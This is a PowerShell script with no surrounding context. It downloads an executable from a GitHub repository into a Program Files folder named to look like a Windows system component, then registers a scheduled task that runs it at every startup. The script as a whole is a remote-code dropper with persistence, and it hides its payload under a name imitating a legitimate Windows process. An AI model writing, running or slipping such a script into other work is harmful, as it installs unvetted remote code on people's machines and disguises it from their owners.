New-Item "C:\Program Files\Common Files\Windows Host Process" -Type Directory

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KyrVorga/Honk/main/WindowsHostProcess.exe" -OutFile "C:\Program Files\Common Files\Windows Host Process\WindowsHostProcess.exe"

$action = New-ScheduledTaskAction -Execute "C:\Program Files\Common Files\Windows Host Process\WindowsHostProcess.exe"
$trigger = New-ScheduledTaskTrigger -AtStartup

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'WindowsHostProcess'
